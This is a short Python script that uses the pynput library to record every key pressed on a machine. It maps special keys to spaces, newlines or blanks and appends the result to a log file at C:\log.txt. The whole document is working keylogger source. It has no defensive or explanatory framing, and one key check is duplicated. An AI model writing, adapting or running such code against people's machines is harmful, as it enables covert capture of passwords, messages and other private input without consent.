from pynput.keyboard import Listener

print("Strted file")

def writeToFile(key):
    char = str(key).replace("'", "")

    if char == "Key.space":
        char = " "
    elif char == "Key.shift_r":
        char =  ""
    elif char == "Key.shift_l":
        char = ""
    elif char == "Key.enter":
        char = "\n"
    elif char == "Key.alt_l":
        char = ""
    elif char == "Key.alt_r":
        char = ""
    elif char == "Key.ctrl_l":
        char = ""
    elif char == "Key.ctrl_l":
        char = ""
    elif char == "Key.tab":
        char = "[TAB]"
        
    #Path to log file
    with open("C:\\log.txt", 'a') as f:
        f.write(char)

with Listener(on_press=writeToFile) as l:
    l.join()